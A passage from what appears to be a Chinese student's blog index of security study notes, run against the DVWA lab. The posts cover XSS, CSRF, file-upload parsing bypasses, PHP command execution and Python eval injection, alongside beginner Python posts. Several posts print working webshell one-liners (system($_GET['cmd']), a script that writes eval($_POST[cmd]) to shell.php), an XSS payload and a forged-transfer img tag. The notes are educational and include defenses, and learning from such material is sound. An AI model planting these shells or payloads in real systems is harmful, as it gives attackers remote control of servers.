能被攻击。\n3、DOM XSSDOM XSS全称就是DOM Based XSS，即基于DOM的XSS，其中的DOM（Document Object Model）是文档对象模型。这种攻击不是以是否存储在服务器中来进行划分。理论上它属于反射型XSS攻击，但之所以把它独立归类，当然是它又特色。这种攻击不依赖于起初发送到服务器的恶意数据。这似乎于前面的XSS有出入，但有一个例子可以用来解释这种攻击。\n当Javascript 在浏览器执行时，浏览器提供给Javascript代码几个DOM对象。文档对象首先在这些对象之中，并且它代表着大多数浏览器呈现的页面的属性。这个文档对象包含很多子对象，如location、 URL和referrer. 这些对象根据浏览器的显示填充浏览器。因此，document.URL和document.location是由页面的URL按照浏览器的解析填充的。要注意的是，这些对象不是提取自HTML的body,它们不会出现在数据页面。文档对象包含一个 body对象，它代表对于HTML的解析。\n&lt;HTML>\n&lt;TITLE>Welcome!&lt;/TITLE>\nHi\n&lt;SCRIPT>\nvar pos=docunment.URL.indexof(\"name=\")+5;\ndocument.write(document.URL.substring(pos,document.URL.length));\n&lt;/SCRIPT>\n&lt;BR>\nWelcome to our system\n&lt;/HTML>\n\n以上是HTML里面解析URL和执行一些客户端逻辑的代码。然后，在发送请求的后面加上如下的指令：http://www.example.com/welcome.html?name=abc&lt;script&gt;alert(document.coocoo);&lt;/script&gt;\n但受害者访问到该网页时，浏览器会解析这个HTML为DOM，DOM包含一个对象叫document，document里面有一个URL属性，这个属性里填充着当前页面的URL。但解析器到达JavaScript代码，他会执行它并修改HTML页面。倘若代码中应用了document.URL，那么这部分的字符串就会在解析时嵌入到HTML中，然后就立即解析，同时，JavaScript代码会找到（alert(document.cookie))并且在同 一个页面执行它，这就产生了XSS攻击条件。\n4、检测在前面的部分介绍了XSS的原理及其类型。由此可以看出，XSS攻击是与SQL注入类似的代码注入类漏洞。并且在JavaScript灵活运用的今天，对于XSS的检测与预防必不可少。\n下面简单介绍一下XSS的预防措施，也是我从别的地方看到的。(1)输入检测对用户输入的数据进行检测。对于这些代码注入类的漏洞原则上是不相信用户输入的数据的。所以，我们要对用户输入的数据进行一定程度的过滤， 将输入数据中的特殊字符与关键词都过滤掉，并且对输入的长度进行一定的限制。 只要开发的人员严格检查每个输入点，对每个输入点的数据进行检测和XSS过滤，是可以阻止XSS攻击的。现在很多网站都已经对用户输入进行了一定的过滤来保证安全性，但是新手开发的就不一定了。(2)输出编码通过前面XSS的原理分析，我们知道造成XSS的还有一个原因是应用程序直接将用户输入的数据嵌入HTML页面中。如果我们对用户输入的数据进行编码，之后在嵌入页面中，那么HTML页面会将输入的数据当作是普通的数据进行处理。这样就可以一定程度避免执行恶意脚本。(3) Cookie 安全利用XSS攻击可以轻易获取到用户的Cookie信息，XSS偷Cookie然后再用用户Cookie来做坏事。那么需要对用户的Cookie进行一定的处理。首先应尽可能减少Cookie中敏感信息的存储，并且尽量对Cookie使用多次散列算法存放。之前再说密码学的时候也有提到散列算法，并且有不可逆性，不存在碰撞和存在雪崩效应。可以更加安全的保护用户信息，几乎无法被破译。有的计算机系统的登录认证也是使用散列来存储用户密码。\n参考文献[1]陈铁明.网络空间安全实战基础:第一版.北京:人民邮电出版社,2018\n","slug":"XSS跨站入门基础知识","date":"2020-03-09T07:49:59.000Z","categories_index":"学习笔记","tags_index":"网络安全,WEB,XSS","author_index":"A1andNS"},{"id":"e5e3a6aac05f155097d5d514020d33d1","title":"CSRF基础学习","content":"上一篇博客说的是XSS跨站脚本攻击，现在说的是另一种跨站攻击，CSRF（Cross-Site Request Forgery),跨站请求伪造。\n1、概述正如其名，CSRF是伪造请求，就是冒充用户在站内进行正常操作。我们知道，绝大多数网站是通过Cookie等方式辨别用户身份（包括使用服务器端Session的网站，因为Session ID也是保存在Cookie里面），再予以授权。这就是为什么要保护好用户的Cookie。所以要想要伪造用户的正常操作，就是要偷Cookie了，那么可能就和上一篇里面说过的XSS优点关联了，利用XSS攻击获取被攻击者的Cookie，在或者就是使用链接欺骗等途径，让用户在本机发起用户所不知道的请求，这里说的本机是拥有Cookie的浏览器端。\n2008年时由多个国内外大型社区和交互网站爆出CSRF漏洞，也是让大家聚焦这个漏洞。其实这种攻击方式在2000年就已经被国外的安全人员提出，但是在国内，直到2006年才开始被关注。\n2、分类CSRF漏洞的攻击一般分为站内和站外两种类型。\nCSRF站内类型的漏洞一般都是因为程序员滥用 $_REQUEST类变量造成的，一些敏感数据本来应该使用POST请求传参，但是因为使用了 $_REQUEST等变量，程序也可以接受GET类型请求传参，这样无形之中就给攻击者提供了使用CSRF的条件，一般攻击者只要把预测好的请求参数放入站内的一个帖子或者留言的图片链接里，受害者浏览了这样的页面就会被强制发起请求。\nCSRF站外类型的漏洞其实就是外部数据提交问题，一般程序员会考虑给一些留言评论等的表单加上水印防止SPAM问题，但是为了用户的体验性，一些操作可能没有做任何限制，这是很危险的做法，因此攻击者可以向预测好请求的参数，在站外的Web页面里编写JavaScript脚本伪造文件请求或和自动提交的表单来实现GET、POST请求，用户在会话状态下单击链接访问站外的Web页面，客户端就被强迫发起请求。\n3、原理CSRF的原理如图\n\n这就相当于受害者需要在登录A网站之后，再去访问B网站，而B网站一般就是一些钓鱼或者诈骗网站了。\n4、攻击场景这里举一个例子说明：\n假设有一个银行A，它允许使用GET方式请求来转账操作，当然这就是个例子而已，现实生活中的银行当然不可能只用GET请求转账。大家就看看就好，别想太多。\n操作：http://www.Abank.com/Transfer.php?tobankID=13&amp;money=1000\n这个时候危险的网站B的代码段中存在这样的一句代码：&lt;img scr=&quot; http://www.Abank.com/Tranfer.php?tobankID=13&amp;money=1000&quot; /&gt;\nr.php?tobankID=13&amp;money=1000” /&gt;`\n那么当返回A银行时，就会发现账户上已经少了1000元。\n","slug":"CSRF基础学习","date":"2020-03-09T07:48:04.000Z","categories_index":"学习笔记","tags_index":"网络安全,WEB","author_index":"A1andNS"},{"id":"99138ec644b11a428edfab781d45e70d","title":"一文简单入门文件上传","content":"随着Web应用发展和广泛应用，很多的应用都允许用户上传自己的文件，以此提升用户体验。但是，这也就造成了一个web应用安全中很著名的漏洞，它就是文件上传漏洞。由于Web应用的上传功能的代码实现没有对用户上传文件的格式和后缀以及文件类型进行过滤，从而导致大家都可以任意上传文件到服务器中，那么攻击者就会通过web访问的目录上传任意的PHP文件，并且能够将这些文件在PHP解释器上运行，从而可以远程控制服务器。这种方式很直接，没有说明门槛，就是上传控制。一般都会上传木马，然后利用木马来读/写服务器上的文件。不过好在，现在很多的程序员都已经意识到这个问题了，上传漏洞现在也比较少了，毕竟大家都开始做过滤了。但是作为安全学习者，必须知道这个漏洞，并且了解其原理。\n1、上传漏洞原理文件上传漏洞一般是指上传Web脚本能够被服务器解析的问题。大多数情况下，攻击者想要完成整个文件上传漏洞攻击时需要满足一定条件的。\n首先，上传的文件能够被Web容器解析执行，所以文件上传后的目录要是Web容器所覆盖的路径。其次，Web 服务器要能访问到该文件，如果上传成功了，但是攻击者不能通过Web途径进行访问，那么就废了，攻击是无法形成的。最后，如果上传的文件被Web安全检测格式化、图片压缩等改变其内容， 导致无法解析的话，攻击也是无法形成的。接下来我会通过DVWA上的上传漏洞实例，学习整个漏洞攻击的过程。首先将DVWA的安全程度调至low,，不然开启默认为impossible，安全级别太高。\n然后在自己本地编写一句话PHP文件，代码如下。\n&lt;?php\n\tphpinfo();\n?>\n\n然后把这个文件在DVWA中进行上传\n\n上传后可以看到上传路径，那么就可以根据这个路径目录去访问上传的文件，我的路径是：http://127.0.0.1/DVWA/hackable/uploads/1.php\n访问之后就可以看到：\n\n这个页面就是文件中编写的那句phpinfo()在Web服务器里执行的效果。\n如果上传的脚本是一个Webshell的话，就可以直接获取服务器的控制权限。\n之前说到上传后的文件会被Web容器解析，其实在文件解析过程中也会产生一些问题。下面就来说一说由哪些问题。\n2、IIS文件解析问题IIS是互联网信息服务，使用IIS 5.x-6.x版本服务器，大多为Windows Service 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。\n（1）目录解析（IIS6.0）形式：www.xxx.com/xx.asp/xx.jpg\n原理：服务器默认会把.asp和.asp目录下的文件都解析成asp文件。\n（2）文件解析形式：www.xxx.com/xx.asp;.jpg\n原理：服务器默认不解析；后面的内容，因此，xx.asp;.jpg便会被解析为asp文件。\n（3）解析文件类型IIS6.0默认的可执行文件除了asp还包含一下3种：/test.asa、/test.cer、/test.cdx\n这样的话可能做了一些过滤，但是攻击者把修改后缀名，绕过一些限制后，依旧可以上传成功，这个假的jpg或其他文件还是成功地被执行了其中的asp代码。\n3、Apache文件解析问题Apache解析文件的规则就是从由到左进行判断解析，如果后缀名为不可识别文件解析，就再往左判断。例如test.php.qwe.rar,.qwe和.rar这两种后缀是Apache不可识别解析的，Apache就会把wooyun.php.qwe.rar解析为PHP文件。\n例如有一个网站www.xxxx.xxx.com/test.php.php123，其余配置问题导致如下漏洞。\n1、如果在Apache的conf里有一行AddHandler php5-script.php,这时只要文件名里包含了.php，即使文件名是test2.php.jpg也会按照PHP来执行。\n2、如果在Apache的conf里有这样一行配置AddType application/x-http-php.jpg，即使拓展名是.jpg，一样能以PHP方式执行。\n4、PHP的CGI路径解析问题Nginx默认以CGI方式支持PHP解析，普通的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php时，$fastcgi_script_name会被设置为”phpinfo.jpg/1.php”，然后构成SCRIPT_FILENAME传递给PHP CGI。但是大家应该都会有一个疑问，PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析？我也时很纳闷，原来是和fix_pathinfo这个选项有关。如果开启了这个选项，就会触发PHP的某些逻辑。\nPHP会以为SCRIPT_FILENAME是phpinfo.jpg,而1.php是PATH_INFO,所以就会自然地把phpinfo.jpg作为PHP来进行解析。\n在举几个例子：\nwww.xxx.com&#x2F;uploadfile&#x2F;image&#x2F;1.jpg&#x2F;1.php\nwww.xxx.com&#x2F;uploadfile&#x2F;image&#x2F;1.jpg%00.php\nwww.xxx.com&#x2F;uploadfiel&#x2F;image&#x2F;1.jpg&#x2F;%20\\0.php\n\n这些例子和上面说的那个原理是一样的，都是x.php作为PAT_INFO，所以以PHP来解析。\n另一种是上传一个名字为test.jpg的文件，文件里是写好的php代码，只要上传成功后访问test.jpg/.php ，就可以在当前目录下生成一个一句话shell木马shell.php。代码如下：\n&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd]) ?>'); ?>\n\n5、上传绕过漏洞在上传漏洞出现后，程序员们当然都意识到这个问题，企业也会开始避免这样的风险，所以大多数网站现在对于上传的文件都有进行一定限制，例如说常见的后缀限制，它们会规定哪些后缀名文件时允许上传的，哪些时不允许的。比如有一个网站它只允许上传后缀为.jpg的图片文件，那么一个攻击者需要使用上面手段去绕过后缀的限制和检测，上传一个木马。这是一个值得思考的问题。\n在很多CTF题里都有上传绕过的题目，更是让我对这个%00的截断方式印象深刻啊。%00似乎是最常用的方法，其实就是攻击者通过手动地去改上传过程中的POST数据报，在文件名的后面给添加一个%00，来达到截断的作用。因为函数在判断一个文件名称和后缀的时候遇到NULL就是代表结束了，而%00对应的正是NULL。（这里的函数指的是C、PHP等语言字符串处理时用到的）\n既然Web应用只允许我们上传.jpg的文件，那么我就如其所愿，给他一个.jpg我们可以构造一个x.php[\\0].jpg,其中，[\\0]就是十六进制的0x00字符。这样就可以成功绕过客户端对于文件后缀的验证，但是在server端，在解析时会被0x00截断，就会解析为x.php，所以就是成功解析为我们想要达到的PHP文件了。这个就是前端绕过client端，后端截断，解析为PHP。\n6、客户端绕过（前端绕过）上面对上传绕过简单讲了一下，下面就详细说一下客户端绕过，我一般也叫它前端绕过。一些比较的CTF题目就会出现前端绕过就OK的情况。\n既然要前端绕过，那就必须要稍微知道，前端时如何来判断过滤的。一般client端都是使用JavaScript来进行一个文件名的校验工作。对于这种方法，其实很简单，我们可以client端输入符合条件的后缀并上传文件，关键在于要使用一个抓包工具，抓包改包重放。抓包就是要抓client验证无误后发给server端的POST分组，改包就是要修改POST请求中的部分内容，重放就是抓了改了当然要放行了。\n介绍一下我用的工具，我一般都是使用Burpsuit来进行抓包的，这是一个很不错的工具，推荐使用。对了专业版会比社区版用起来舒服很多，因为专业版可以修改线程。\n不多说DVWA里演示一下：\n工具：Firefox、burpsuit\n环境：Windows（本机）、DVWA（靶场）\n把安全级别设为low，上传一个后缀被改为了.jpg的文件1.jpg,抓包后结果如下所示：\n\n可以看到filename处显示的时1.jpg我这个时候看到的是我上传的情况，我只要把1.jpg改为1.php就可以了。\n\n然后再提交。结果会如下：\n\n上传成功，这样就绕过了client端，也就是绕过前端了。我实际上传的时1.php\n7、服务端绕过（后端绕过）server端绕过和client端绕过一样，我们还是想了解一下，server端时如何来进行判断的。一般来说server端会通过3种东西来进行判断：content-type字段、文件头、拓展名。那么如果是单种方式，要想绕过验证还是很容易的。但是组合之后就要想办法去绕过每一个校验，当然这也是可以实现的。\n我们一个一个来：\n1.content-type这个字段我记得在之前的博客里面有提到过，它其实就是表示上传文件的类型，其实就是MIME格式表示标识文件。我之前有写过一篇常见的MIME可以供大家查看，这里举几个常见的：imag/jpeg、application/x-php等。\n对于这个还是简单事情我们是可以和client端一样，使用burpsuit抓包改一下就好了。\n把原本的类型用图片的MIME来替换，这里换成了image/jpeg，提交就可以绕过验证了。\n2.文件头这种校验方法其实只需要在木马的前加上文件类型所对应的文件头就可以欺骗绕过了，比如把&lt;?php phpinfo(); ?&gt;变成GIF89A&lt;? php phpinfo(); ?&gt;服务器端就会认为你上传的是gif文件，也就绕过了。\n3.拓展名验证拓展名其实也是在验证MIME，MIME就是多用途互联网邮件拓展类型，相信学习过计算机网络的朋友应该都是知道的。它的作用很大的，比如我访问一个文件，浏览器就会为我寻找合适的应用去运行它，就是因为MIME。\nMIME的作用就是区分不同种类的数据，文件到达服务器后，服务器本地进行MIME的分类 ，这种方式比较验证比较安全，要想绕过唯一方法就是去查找漏网之鱼了，要找有没有被黑名单漏掉的拓展名。这个比前两种都要安全。\n关于修复的思考和总结上传问题也算得上是老问题了。很多开发者也已经有了很多办法来修复这个洞。我自己有一些想法，上传漏洞传上木马后想要远程控制，是需要知道路径和文件可执行的。那么我们可以从此下手，断了他的路。一个是不要回显路径，这个目前基本都做到了，其次是之前在系统安全的博客里有提到我们要善于利用系统的权限控制，我们完全可以把用来存储上传文件的目录设置为不可执行。从而让攻击者无法连上他的木马。当然这是在木马已经上服务器的情况下的一个好办法，重点还是要避免木马轻易就被上传到服务器中。可以前端＋后端多重验证，后端的话拓展名验证是个很好的选择，之前说拓展名的时候有说到黑名单拦截，其实我们不一定使用黑名单，更可以使用白名单，因为我们允许上传的文件类型可能远比不允许上传的文件类型要少，白名单就是一个很好的选择了。对了还有就是图片马，最好要使用图片压缩函数或resize函数，对图片文件进行处理，同时破坏图片中含有的恶意代码。\n","slug":"一文简单入门文件上传","date":"2020-03-09T07:47:04.000Z","categories_index":"学习笔记","tags_index":"网络安全,WEB,文件上传","author_index":"A1andNS"},{"id":"8686173dd05c96864c4b86d1995d7aca","title":"命令执行漏洞","content":"开发人员在进行开发的过程中，或多或少都会调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等。对于开发人员而言，使用这些函数可以方便去除系统的特殊功能等。但是也会带来一些命令执行漏洞。\n黑客在渗透应用时，可能控制了某些函数中的参数，从而把想要执行的恶意代码接入到原来的正常代码中一起执行。\nPHP命令执行漏洞PHP是一门脚本语言，比较简洁、方便，但是不是事先编译好的运行速度上自然是没有优势的。而且他不能接触到系统底层，所以就必须要调用系统函数来执行一些指令，自然就造成了漏洞。\n举几个例子来说明问题：\n&lt;?php\n\tSystem($_GET['cmd']);\n?>\n\n这个我觉得也可以算一句话木马吧，结合命令执行的密码，很多时候程序员代码过滤环节到位，PHP命令执行漏洞很少，我们可以自己创造。\n我将其上传到DVWA里，进行访问http://192.168.42.157/DVWA/hackable/uploads/1.php?cmd=ipconfig\n\n可以看到我输入的命令在系统中被执行了。\n再试一个简单的案例：\n&lt;?php\n\t$cmd=($_GET['cmd']);\n\tSystem(\"ping \".$cmd);\n?>\n\n编写是要注意在ping后面留空格，毕竟cmd命令还是很吃格式的，格式错了那么效果可能就达不到了。一开始写的时候没有注意这个地方，试了一会儿都出不来结果，最后打开cmd对着看了才发现了空格漏了。\n然后上传到DVWA靶机，在访问http://192.168.42.157/DVWA/hackable/uploads/1.php?cmd=www.baidu.com\n\n结果可以看出我输入的参数被成功执行了。这就是两个PHP的简单实例，当然除了代码里的系统函数调用的原因，还有可能是系统本身的漏洞造成命令执行。还有可能是调用的第三方组件纯在代码执行漏洞。这里我目前只有接触到PHP的所以就先这样了，还有很长的路需要走。\n","slug":"命令执行漏洞","date":"2020-03-09T07:45:54.000Z","categories_index":"学习笔记","tags_index":"网络安全,WEB,命令执行","author_index":"A1andNS"},{"id":"8423e555287e52bedc5c5606219a3af6","title":"Python初篇之温度转换","content":"从一个简单的温度转换程序开始。本程序的设计目的是实现摄氏度与华氏度之间的转换，可以多次输入。使用方法：输入n或N终止程序摄氏度正确输入案例：1c、1C华氏度正确输入案例：1f、1FPython环境是Python3\ntempstr=input(\"请输入一个带符号的温度值:\")\nwhile tempstr[-1] not in ['N','n']:\n        if tempstr[-1] in ['F','f']:\n                C=(eval(tempstr[0:-1])-32)/1.8\n                print(\"转换后的温度是&#123;:.2f&#125;C\".format(C))\n        elif tempstr[-1] in ['C','c']:\n                F=1.8*eval(tempstr[0:-1])+32\n                print(\"转换后的温度是&#123;:.2f&#125;F\".format(F))\n        else:\n                print(\"输入格式错误\")\n        tempstr=input(\"请输入一个带符号的温度值:\")\n运行效果如下所示这是一个开始，以后还会继续学习。\n","slug":"Python初篇之温度转换","date":"2020-03-09T07:45:00.000Z","categories_index":"Python学习","tags_index":"Python","author_index":"A1andNS"},{"id":"526fc2b02f39d7fc607c24567a204ab6","title":"9个同心圆（Python turtle）","content":"这个程序用来绘制9个同心圆，程序很简单。运用到的库：turtlepython version：3.7说到turtle是一个很实用的库，实用python来画图，这个库就是一个好帮手了。\nimport turtle\nturtle.setup(400,400,300,300)\nturtle.pensize(1)\nfor i in range(9):\n    turtle.circle(30+(i-1)*20)\n    turtle.penup()\n    turtle.seth(-90)\n    turtle.fd(20)\n    turtle.seth(0)\n    turtle.pendown()\nturtle.done()\n\n运行效果如下所示：\n思考这次编写这个程序的时候一开始编写的代码运行后无法保留在这个图形处，这个窗口会直接被关闭，要想窗口不自动关闭，就需要用到turtle.done()函数了，它的作用就是程序终止而turtle窗口不关闭。\n","slug":"9个同心圆（Python-turtle）","date":"2020-03-09T07:43:47.000Z","categories_index":"Python学习","tags_index":"Python","author_index":"A1andNS"},{"id":"b9ca1258184e8ee98832b57de6133069","title":"核心防御机制之处理用户访问、处理用户输入","content":"web应用的基本安全问题就是所有用户输入都不可信，这一点要有清晰的认识，必须假设用户所有输入都不可信，并且进行相应的过滤，才能较大可能排除哪些不坏好意的输入。Web应用采用的防御机制基本是由一下几个核心因素构成的：\n1、处理用户访问应用程序的数据与功能，防止用户获得未授权的访问。\n2、处理用户对应用程序的输入，防止错误输入造成的不当行为。\n3、处理攻击者，确保应用程序在称为直接攻击目标是能够正常运转，并采取适当的防御与攻击措施挫败攻击者。\n4、管理应用程序本身，帮助管理员监控它的行为，配置其功能。\n一个典型的应用程序的绝大多数受攻击面也是由这些机制构成的。\n注：受攻击面是指对未通过验证的用户的有效功能，也就是说，未通过验证的用户通过软件的默认配置能够达到什么目的。\n处理用户访问几乎任何的Web应用程序都必须满足一个中心安全要求，那就是处理用户访问其数据和功能。一般用户可以分为几种类型，如匿名用户（游客）、正常通过验证的用户和管理用户。大家平时喜欢上网应该都会有所了解。一般不同的用户也是只允许不同的数据，游客可能就无法实现一些功能，验证用户也只能访问服务器里属于自己的信息，管理员用户就不用说了。\n大多数Web Application实用3层相互关联的安全机制来对用户访问进行处理：\n1、身份验证\n2、会话管理\n3、访问控制\n这三者都是应用程序受攻击面的一个关键部分，对于应用程序的的安全很重要，这三者相互依赖，任何一个部分存在缺陷被突破，攻击者就可以达到访问应用程序功能和数据的目的。\n身份验证这个机制试应用程序里处理用户访问的最基本的机制，说简单点就是，确认访问者的真实身份。不使用这个机制将会带来的问题就是，不利于用户管理和数据安全，所有用户都被作为匿名用户对待，将会出现一些问题。\n目前，绝大多数的Web application都会实用传统的身份验证模型，也就是要求用户提交用户名和密码，然后应用程序去核实情况，来确认合法与否。当然一些对安全性要求较高的应用程序还会实用其他手段来验证，例如其他证书和多阶段登录过程强化，甚至实用客户端证书、智能卡等。这个银行的application就很明显了，大家使用网上银行的时候可能都会被要求安装数字证书等。除了进行身份验证，身份验证机制一般还会提供一些支持型功能，比如大家熟悉的账号注册，密码找回和密码修改。\n\n但是身份验证机制的设计和执行方面，还是会存在缺陷。攻击者可能可以确定其他用户用户名、并且通过一定手段推测它们密码，又或者利用验证系统在设计时的缺陷，绕过登陆验证。攻击者甚至会攻击应用程序采用的与身份验证有关的功能，借此来非法访问数据。\n会话管理身份验证结束后，用户也就登录成功了，那么就可以使用一些功能和访问一些页面，那么浏览器就会发出一系列的HTTP请求。同时其他用户可能也在发出无数请求。为了可以有效的访问控制，就必须要识别来自每一位用户的请求。所以应用程序就为每一个用户建立一个会话，并且向用户发布一个标识会话的令牌。令牌是一个唯一的字符串，唯一标识一个用户。通过令牌，浏览器的HTTP请求就可以被应用程序识别，并把请求与用户关联起来。虽然很多的应用使用隐藏表单字段或URL查询字符串传送session token，当HTTP cookie才是实现这一目的的常规方法。这就是为什么攻击者会使用XSS攻击偷取cookie然后伪造用户访问或进行CSRF攻击。如果用户一段时间没有发出请求，会话就会自动终结。\n所以会话管理的关键就在于Token的安全，大多数攻击者都会想要获取用户令牌。如果可以偷取到令牌，攻击者就可以伪装用户使用应用程序。令牌生成过程中存在的缺陷是主要的漏洞来源，攻击者能够推测发给用户的令牌，然后去截获令牌。也有少数应用不使用令牌，而是使用其他方法来确认用户身份。有时应用程序会将状态信息存储在客户端而非服务器，并且对这些信息进行加密。\n访问控制访问控制是前两者正常工作后一个重要的机制，它需要进行正确决策，决定允许还是拒绝认证用户的请求。这是一个很关键的过程，需要是实现进行设计的逻辑，考虑应用领域和不同类型功能，需要根据请求访问者的身份，来判断其是否有相关权限。甚至对一些特殊操作及进行较为严格的访问控制和检查。但是访问控制比较复杂，所以在一些权限的配置上可能存在疏忽，从而导致漏洞，或者开发者在开发时对一些功能存在错误判断，使攻击者可以未经授权访问应用程序的数据和功能。但是寻找访问控制上的漏洞也是一件费力的工作，必须要一个一个重复进行检查。当一旦成功，也会造成一定的损失。\n处理用户输入所有用户输入都不可信。所有必须要采取一定的措施来过滤和避免有人输入恶意内容。因此必须要安全处理用户输入，这是应用程序安全的一个关键。通常输入确认是防御这些攻击的必要手段，但是任何一种保护机制都不是绝对安全的。\n输入的多样性在许多情况下，应用程序可能会对一些特殊输入实行非常严格的确认检查。所以你会看到在注册一个账号的时，网站会对用户名和密码的字符有要求，如长度，所能包含的字符。\n在其他情况下，可能要接受更加广泛的输入。比如说填写地址就会涉及到很多的字符。但是依旧要对字段进行有效限制。比如不能超过最大长度，不能包含一些HTML等语言的标记。\n还有一些场景，应用必须完全接受用户提交的完全任意的输入，例如想CSDN博客一样，我在这里写博客，博客里可能会含有一些有害的字段（演示用），但是CSDN有不能拒绝我这样写作。所以就要想办法来解决这个问题，并且要以安全的方式来向用户显示。\n输入处理方式通常可以采用各种方法来处理用户输入，不同方法一般使用与不同的情形与不同类型的输入，有时最好结合采用几种方法。\n1、拒绝已知的不良输入这个一般使用黑名单来进行字符串或模式的匹配，并且阻止任何与黑名单匹配的数据，并接受其他数据。不过这个有点不太好，效率不高，目前攻击的字符语句越来越多，各式各样。加上不同的编码方式赋予了攻击语句不同的形似，而且很可能会忽略某些攻击语句和模式，很明显黑名单无法满足满足需求。\n2、接受已知的正常输入这个和上面的刚好相反，这个就是个白名单，在某种意义上它似乎对于处理恶意输入很有效，因为只有白名单可以接受，其他统统不要，而制定白名单的是否肯定很谨慎，所以基本上恶意输入可以被过滤掉，但是它同时会给用户的输入带来不太好的体验，可能无法满足用户的输入需求，比较死板。所以虽然它极其有效，但是基于白名单的方法并非是解决处理用户输入问题的万能办法。\n3、净化这种方法允许有时需要接受无法保证安全的数据，application不拒绝这种输入，而是，以各种方法来净化，防止它造成任何不利的影响。数据中可能存在的恶意字符会被删除，只留下安全字符。或者在进一步处理前对它进行编码或转义。基于数据净化的方法一般非常有效。比如可以在危险字符植入应用页面前对其进行HTML编码，这是防XSS攻击的常用方法，目前有很多网页都是把危险脚本进行HTML编码，使其无法达到目的。但是如果是一个输入包含多种而已数据，这个净化就不太OK了，这时最好就要使用边界确认来解决了。\n4、安全数据处理以不安全的方式处理用户提交的数据，是许多Web应用程序漏洞形成的根本原因。通常，不需要确认输入本身，只需确保处理过程绝对安全，就可以避免这些漏洞。有时候可以使用安全的编程方法避免常见问题。例如在数据库访问过程中正确使用参数化查询，就可以避免SQL注入攻击。\n5、语法检查，就可以避免这些漏洞。有时候可以使用安全的编程方法避免常见问题。例如在数据库访问过程中正确使用参数化查询，就可以避免SQL注入攻击。\n5、语法检查当攻击者提交的输入于普通的非恶意用户提交的输入完全相同，再多的语法确认也无法区别用户和攻击者的数据。为了防止未授权的访问，应用程序必须确认所提交的账号属于之前提交该账户的用户。\n","slug":"核心防御机制之处理用户访问、处理用户输入","date":"2020-03-09T07:41:41.000Z","categories_index":"学习笔记","tags_index":"网络安全","author_index":"A1andNS"},{"id":"627388fd642a6b198cb0eb0502f3acb1","title":"Python之汉诺塔问题及python安全","content":"今天学习了一下汉诺塔问题，像了许久啊！！脑袋不太OK！记得上次看到汉诺塔是我在看电影的时候，电影场景里给大猩猩测试智商的。。。。\n这里使用的是Python3编写的代码，毕竟大家都知道2020年的1月1日Python2已经正式退休了。下面是Python3的时代了。\n发现规律后就会意识到这个就是一个递归函数，挺明显的。\n代码如下：'''\n下面是汉诺塔问题不同的圆盘个数实现任务的次数规律：\nn=1    a=1   f(x) = 1\nn=2    a=3   f(2) = 2*f(1)+1\nn=3    a=7   f(3) = 2*f(2)+1\nn=4    a=15  f(4) = 2*f(3)+1\n...    ...   f(n) = 2*f(n-1)+1\n'''\ndef Move(n,a,b,c):\n    if n == 1:\n        print (a,'--->',c)    #如果只有一个圆盘就直接把它从A拿到C，并且结束程序。\n        return 0\n    else:           #不是一个圆盘那么就要对n-1个圆盘从A移到B\n        Move(n-1,a,c,b)\n        print (a,'--->',c)   #把最底下的那个从A移动到C\n        Move(n-1,b,a,c)       #最后把在B的n-1个圆盘移动到C\nnumber = input('请输入圆盘的个数（整数数字）：')\nMove(eval(number),'A','B','C')\n\n\n\n运行效果如下：思考说起Python，这也是一门解释型语言所以它肯定会存在一些注入漏洞，之前在看SQL注入的时候就一直在想Python注入会是什么样的。今天就试一试，因为刚好我在编写代码的时候使用到了eval()函数，这个函数可以把字符串转换为Python可以理解的语句，这样就产生了了一个命令执行漏洞。就不具体讲了，所以我发现它是可以被利用于注入的。所以我就设置了一个flag进行简单是实验：\n'''\n下面是汉诺塔问题不同的圆盘个数实现任务的次数规律：\nn=1    a=1   f(x) = 1\nn=2    a=3   f(2) = 2*f(1)+1\nn=3    a=7   f(3) = 2*f(2)+1\nn=4    a=15  f(4) = 2*f(3)+1\n...    ...   f(n) = 2*f(n-1)+1\n'''\nflag='A1andNS&#123;sfji_341bghsdf_6ygsfuh&#125;'\ndef Move(n,a,b,c):\n    if n == 1:\n        print (a,'--->',c)    #如果只有一个圆盘就直接把它从A拿到C，并且结束程序。\n        return 0\n    else:           #不是一个圆盘那么就要对n-1个圆盘从A移到B\n        Move(n-1,a,c,b)\n        print (a,'--->',c)   #把最底下的那个从A移动到C\n        Move(n-1,b,a,c)       #最后把在B的n-1个圆盘移动到C\nnumber = input('请输入圆盘的个数（整数数字）：')\nMove(eval(number),'A','B','C')\n\n代码如上，然后运行一下：\n\n照常请求输入数字，但是我会输入print(flag)语句：\n\n运行一下结果如下：\n\n我要的Flag被直接显示出来了，当然由于eval(‘print flag’)被执行，所以python报错了，Move()函数就传参异常了。\n防范那么要怎么样来防止被恶意执行命令呢？\n可以从eval()函数自身开始看，利用eval()的两个设置 限制条件的位来设置白名单，从而避免被执行。\n'''\nn=1    a=1   f(x) = 1\nn=2    a=3   f(2) = 2*f(1)+1\nn=3    a=7   f(3) = 2*f(2)+1\nn=4    a=15  f(4) = 2*f(3)+1\n...    ...   f(n) = 2*f(n-1)+1\n'''\nflag='A1andNS&#123;sfji_341bghsdf_6ygsfuh&#125;'\ndef Move(n,a,b,c):\n    if n == 1:\n        print (a,'--->',c)\n        return 0\n    else:\n        Move(n-1,a,c,b)\n        print (a,'--->',c)\n        Move(n-1,b,a,c)\nnumber = input('请输入圆盘的个数（整数数字）：')\nMove(eval(number,&#123;'input':input&#125;,&#123;'input':input&#125;),'A','B','C')\n\n\n比如我把eval函数加了限制后再去执行print(flag)，就不起作用了。\n\n当然这只是一个简单的实验，证实了eval函数在带来便利的同时也会带来一些风险，这些风险需要被重视，并且安全的使用eval函数。否则就会造成一些不必要的损失。\n","slug":"Python之汉诺塔问题及python安全","date":"2020-03-09T07:40:14.000Z","categories_index":"Python学习","tags_index":"网络安全,Python","author_index":"A1andNS"},{"id":"54c75574745375be4c44850b85f0e669","title":"Python之pip使用","content":"pip安装Python拥有很多的第三方库，这也是Python优秀的计算生态的组成部分，也是Python的一大特点。这些第三方库可以说解决了不少开发者的问题，也极大的方便了开发者和初学者。\n说到安装第三方库，就必须用一些办法来安装这些库，其中官方给的就是pip方法，首先要想安装pip，我们可以在https://pypi.org/project/pip/这个网站找到我们想要的pip，我们一般是下载.tar.gz的源码类型的文件